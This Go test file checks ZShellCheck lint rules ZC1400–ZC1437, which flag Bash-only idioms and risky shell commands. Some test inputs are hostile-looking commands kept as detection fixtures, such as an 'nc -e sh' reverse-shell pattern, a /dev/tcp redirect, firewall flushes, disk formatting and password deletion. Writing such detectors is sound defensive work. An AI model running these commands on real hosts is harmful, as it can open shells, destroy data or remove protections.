// SPDX-License-Identifier: MIT
// Copyright the ZShellCheck contributors.
package katas

import (
	"testing"

	"github.com/afadesigns/zshellcheck/pkg/katas"
	"github.com/afadesigns/zshellcheck/pkg/testutil"
)

func TestZC1400(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — awk for other field",
			input:    `awk '{print $1}' file`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — cut on HOSTTYPE",
			input: `cut -d- -f1 $HOSTTYPE`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1400",
					Message: "Use Zsh `$CPUTYPE` for pure architecture instead of splitting `$HOSTTYPE` with `cut`/`awk`/`sed`.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1400")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1401(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — awk for other field",
			input:    `awk '{print $1}' file`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — cut on MACHTYPE",
			input: `cut -d- -f2 $MACHTYPE`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1401",
					Message: "Use Zsh `$VENDOR` for vendor field instead of splitting `$MACHTYPE` with `cut`/`awk`/`sed`.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1401")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1402(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — date +fmt",
			input:    `date +%Y-%m-%d`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — date -d",
			input: `date -d @1700000000 +%Y-%m-%d`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1402",
					Message: "Use Zsh `strftime` (from `zsh/datetime`) instead of `date -d @N -- +fmt`. The `-d`/`@` form is GNU-specific; `strftime` is portable Zsh.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1402")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1403(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — echo $SAVEHIST (Zsh)",
			input:    `echo $SAVEHIST`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — echo $HISTFILESIZE",
			input: `echo $HISTFILESIZE`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1403",
					Message: "`$HISTFILESIZE` is Bash-only. Zsh uses `$SAVEHIST` for on-disk history size. Setting `HISTFILESIZE` in Zsh has no effect.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1403")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1404(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — echo $commands (Zsh)",
			input:    `echo $commands`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — echo $BASH_CMDS",
			input: `echo $BASH_CMDS`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1404",
					Message: "`$BASH_CMDS` is Bash-only. In Zsh use `$commands` (assoc array, names→paths) via `zsh/parameter`.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1404")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1405(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — env -i clean env",
			input:    `env -i cmd`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — env -u VAR",
			input: `env -u DEBUG cmd`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1405",
					Message: "Use `(unset VAR; cmd)` subshell instead of `env -u VAR cmd`. In-shell scoping, no external process.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1405")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1406(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — xargs without -P",
			input:    `xargs -n 1 echo`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — xargs -P 4",
			input: `xargs -P 4 cmd`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1406",
					Message: "Consider `zargs -P N` (autoload -Uz zargs) instead of `xargs -P N`. Parallel execution with Zsh functions in scope — no subshell-per-item.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — xargs -P4 attached",
			input: `xargs -P4 cmd`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1406",
					Message: "Consider `zargs -P N` (autoload -Uz zargs) instead of `xargs -P N`. Parallel execution with Zsh functions in scope — no subshell-per-item.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1406")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1407(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — regular file path",
			input:    `cat /etc/hosts`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — /dev/tcp redirect",
			input: `echo hi > /dev/tcp/1.2.3.4/80`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1407",
					Message: "`/dev/tcp/...` and `/dev/udp/...` are Bash-only virtual files. In Zsh load `zsh/net/tcp` and use `ztcp host port` / `ztcp -c $fd` for TCP.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1407")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1408(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — echo $FPATH",
			input:    `echo $FPATH`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — echo $BASH_FUNC_myfn",
			input: `echo $BASH_FUNC_myfn`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1408",
					Message: "`BASH_FUNC_*` exported-function envvars are Bash-only. Zsh does not consume them; export function definitions via `autoload` + `$FPATH` instead.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1408")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1409(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — test -f file",
			input:    `test -f file`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — test -N file",
			input: `test -N file`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1409",
					Message: "`test -N file` (modified-since-read) is a Bash extension. In Zsh use `zmodload zsh/stat; zstat -H s file; (( s[mtime] > s[atime] ))`.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1409")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1410(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — zstyle usage",
			input:    `zstyle ':completion:*' menu select`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — compopt invocation",
			input: `compopt -o nospace`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1410",
					Message: "`compopt` is a Bash-only completion builtin. Zsh compsys uses `zstyle` (e.g. `zstyle ':completion:*' menu select`) for equivalent tuning.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1410")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1411(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — enable builtin",
			input:    `enable name`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — enable -n builtin",
			input: `enable -n echo`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1411",
					Message: "Use Zsh `disable name` instead of `enable -n name`. Zsh has a dedicated `disable` builtin that reads clearer.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1411")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1412(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — echo $candidates",
			input:    `echo $candidates`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — echo $COMPREPLY",
			input: `echo $COMPREPLY`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1412",
					Message: "`$COMPREPLY` is a Bash-only completion output array. In Zsh compsys use `compadd -- candidate1 candidate2`.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1412")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1413(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — hash -r reset",
			input:    `hash -r`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — hash -t",
			input: `hash -t ls`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1413",
					Message: "Use `whence -p cmd` (Zsh) instead of `hash -t cmd`. `whence -p` always returns the absolute path, regardless of hash state.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1413")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1414(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — hash -r",
			input:    `hash -r`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — hash -d",
			input: `hash -d ls`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1414",
					Message: "`hash -d` has opposite semantics in Bash (delete) vs Zsh (define named directory). Use `unhash cmd` for Zsh command-hash removal, or `hash -d NAME=/path` for named-directory definition.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1414")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1415(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — trap 'cmd' EXIT",
			input:    `trap 'cleanup' EXIT`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — trap 'cmd' ERR",
			input: `trap 'echo oops' ERR`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1415",
					Message: "Prefer Zsh `TRAPZERR() { ... }` function over `trap 'cmd' ERR`. The named-function form is more idiomatic and composable in Zsh.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1415")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1416(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — trap 'cmd' EXIT",
			input:    `trap 'cleanup' EXIT`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — trap 'cmd' DEBUG",
			input: `trap 'echo $BASH_COMMAND' DEBUG`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1416",
					Message: "Use Zsh `preexec() { ... }` (or `add-zsh-hook preexec`) instead of `trap 'cmd' DEBUG`. Zsh's DEBUG trap does not fire the same way as Bash's.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1416")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1417(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — trap 'cleanup' EXIT",
			input:    `trap 'cleanup' EXIT`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — trap 'cmd' RETURN",
			input: `trap 'print done' RETURN`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1417",
					Message: "Prefer Zsh `TRAPRETURN() { ... }` function over `trap 'cmd' RETURN`. Named-function form is more idiomatic in Zsh.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1417")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1418(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — ulimit -t",
			input:    `ulimit -t 10`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — ulimit -H",
			input: `ulimit -H -t 60`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1418",
					Message: "Use Zsh `limit -h` (hard) / `limit -s` (soft) instead of `ulimit -H`/`-S`. Zsh's `limit` builtin is more human-readable.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1418")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1419(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — chmod 755",
			input:    `chmod 755 script.sh`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — chmod 777",
			input: `chmod 777 file`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1419",
					Message: "Avoid `chmod 777`/`a+rwx` — grants world-writable access. Prefer restrictive modes (755, 644, 700, 600) matched to the actual file purpose.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — chmod a+rwx",
			input: `chmod a+rwx dir`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1419",
					Message: "Avoid `chmod 777`/`a+rwx` — grants world-writable access. Prefer restrictive modes (755, 644, 700, 600) matched to the actual file purpose.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1419")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1420(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — chmod 755",
			input:    `chmod 755 file`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — chmod 2755 (setgid)",
			input: `chmod 2755 binary`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1420",
					Message: "Numeric mode with leading 4/2/6 sets setuid/setgid — privilege-escalation risk.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — chmod 4755",
			input: `chmod 4755 binary`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1420",
					Message: "Numeric mode with leading 4/2/6 sets setuid/setgid — privilege-escalation risk.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1420")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1421(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — chpasswd -e (encrypted)",
			input:    `chpasswd -e`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — chpasswd -c (plaintext)",
			input: `chpasswd -c SHA512`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1421",
					Message: "`chpasswd` without `-e`/`--encrypted` accepts plaintext passwords — avoid piping cleartext credentials into the process tree. Use a password hash (`-e`) or a credentials store.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1421")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1422(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — sudo -u user cmd",
			input:    `sudo -u alice whoami`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — sudo -S cmd",
			input: `sudo -S apt update`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1422",
					Message: "`sudo -S` enables password-via-stdin. Avoid piping plaintext credentials. Use `sudo -A` (askpass), `NOPASSWD:` in sudoers, or `pkexec`.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1422")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1423(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — iptables -A",
			input:    `iptables -A INPUT -p tcp --dport 22 -j ACCEPT`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — iptables -F",
			input: `iptables -F`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1423",
					Message: "Flushing firewall rules with `-F` removes every rule — risk of locking yourself out of remote hosts. Save + use rollback mechanism.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — nft flush ruleset",
			input: `nft flush ruleset`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1423",
					Message: "`nft flush ruleset` clears every firewall table — risk of locking yourself out of remote hosts. Save + use rollback mechanism.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1423")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1424(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — unrelated command",
			input:    `echo hello`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — mkfs.ext4",
			input: `mkfs.ext4 disk.img`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1424",
					Message: "`mkfs.ext4` formats / wipes a device — destroys data. Validate the target with `lsblk` / `blkid` first, and consider an interactive confirmation.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — mkswap",
			input: `mkswap swap.img`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1424",
					Message: "`mkswap` formats / wipes a device — destroys data. Validate the target with `lsblk` / `blkid` first, and consider an interactive confirmation.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1424")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1425(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — unrelated command",
			input:    `echo goodbye`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — shutdown now",
			input: `shutdown now`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1425",
					Message: "`shutdown` takes down the system. In scripts, confirm the caller really wants this (interactive prompt, feature flag, or CI guard).",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — reboot",
			input: `reboot now`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1425",
					Message: "`reboot` takes down the system. In scripts, confirm the caller really wants this (interactive prompt, feature flag, or CI guard).",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1425")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1426(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — git clone https URL",
			input:    `git clone https://github.com/owner/repo.git`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — git clone http URL",
			input: `git clone http://example.com/repo.git`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1426",
					Message: "`git clone http://` is unencrypted/unauthenticated. Use `https://` or SSH with verified host keys.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1426")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1427(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — nc -l listener without -e",
			input:    `nc -l 1234`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — nc -e",
			input: `nc -e sh 127.0.0.1 1234`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1427",
					Message: "`nc -e` spawns an arbitrary command for each connection — reverse-shell territory. Remove from scripts unless audited and restricted.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1427")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1428(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — curl with no auth",
			input:    `curl https://example.com`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — curl -u user:pass",
			input: `curl -u alice:secret123 https://example.com`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1428",
					Message: "`curl -u user:pass` leaks credentials into the process list. Use `-u user:` (prompt), `--netrc`, or a credentials manager.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1428")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1429(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — umount /mnt",
			input:    `umount /mnt/disk`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — umount -f",
			input: `umount -f /mnt/disk`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1429",
					Message: "`umount -f`/`-l` force/lazy unmount masks the underlying 'busy' error. Find open files with `lsof` / `fuser -m` and close them properly.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — umount -l",
			input: `umount -l /mnt/disk`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1429",
					Message: "`umount -f`/`-l` force/lazy unmount masks the underlying 'busy' error. Find open files with `lsof` / `fuser -m` and close them properly.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1429")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1430(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — sched in-shell",
			input:    `sched +1:00 cmd`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — at now",
			input: `at now + 1 minute`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1430",
					Message: "Prefer Zsh `sched` (from `zsh/sched`) for in-shell scheduling instead of `at`/`batch`. No daemon dependency, runs in the current shell's environment.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1430")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1431(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — crontab -l (list)",
			input:    `crontab -l`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — crontab -r",
			input: `crontab -r`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1431",
					Message: "`crontab -r` removes all cron jobs with no backup. Save first (`crontab -l > cron.bak`) and use `crontab -ir` for interactive confirmation.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1431")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1432(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — passwd -l (lock)",
			input:    `passwd -l alice`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — passwd -d (delete)",
			input: `passwd -d alice`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1432",
					Message: "`passwd -d user` deletes the password — account becomes passwordless. Use `passwd -l user` to lock, or `usermod -L` + delete SSH keys to disable login.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1432")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1433(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — userdel plain",
			input:    `userdel alice`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — userdel -f",
			input: `userdel -f alice`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1433",
					Message: "`userdel -f`/`-r` forcibly removes user (kills processes, deletes home). Check for active sessions first with `who -u` / `loginctl list-users`.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — userdel -rf",
			input: `userdel -rf alice`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1433",
					Message: "`userdel -f`/`-r` forcibly removes user (kills processes, deletes home). Check for active sessions first with `who -u` / `loginctl list-users`.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1433")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1434(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — swapoff specific file",
			input:    `swapoff swap.img`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — swapoff -a",
			input: `swapoff -a`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1434",
					Message: "`swapoff -a` disables ALL swap areas — risks OOM on memory-constrained hosts. Disable specific swaps (`swapoff /swapfile`) after checking `free -m`.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1434")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1435(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — killall plain",
			input:    `killall myproc`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — killall -9",
			input: `killall -9 myproc`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1435",
					Message: "`killall -9 name` force-kills every matching process, including unrelated instances on multi-user or containerized hosts. Start with -TERM, or kill by PID after `pgrep`/`pidof`.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1435")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1436(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — sysctl -p (reload from config)",
			input:    `sysctl -p`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — sysctl -w (ephemeral)",
			input: `sysctl -w vm.swappiness=10`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1436",
					Message: "`sysctl -w` setting is lost on reboot. Persist in `/etc/sysctl.d/*.conf` and reload with `sysctl --system`.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1436")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1437(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — dmesg -T (human time)",
			input:    `dmesg -T`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — dmesg -c",
			input: `dmesg -c`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1437",
					Message: "`dmesg -c`/`-C` clears the kernel ring buffer — subsequent debugging loses earlier messages. Use plain `dmesg` or `journalctl -k`.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
